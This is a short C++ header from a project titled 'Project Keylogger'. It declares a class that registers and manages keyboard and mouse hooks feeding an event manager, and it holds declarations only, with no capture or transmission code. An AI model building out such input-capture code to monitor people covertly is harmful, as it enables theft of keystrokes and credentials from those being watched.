/**
 *									Project Keylogger
 */


#ifndef								_HOOKHANDLER_H
#define								_HOOKHANDLER_H 
	
#include							<vector>
	
#include							"EventManager.h"
#include							"KeyboardHook.h"
#include							"MouseHook.h"
#include							"KeyboardHookObserver.h"
#include							"MouseHookObserver.h"

class								HookHandler {
public: 
    HookHandler(const EventManager&);
    const bool						addHook(AHook*);
    const bool						removeHook(AHook*);
	const bool						init();
	const bool						stop();

private: 
	std::vector<AHook*>				_hooks;
    const EventManager&				_eventManager;
};

#endif								//_HOOKHANDLER_H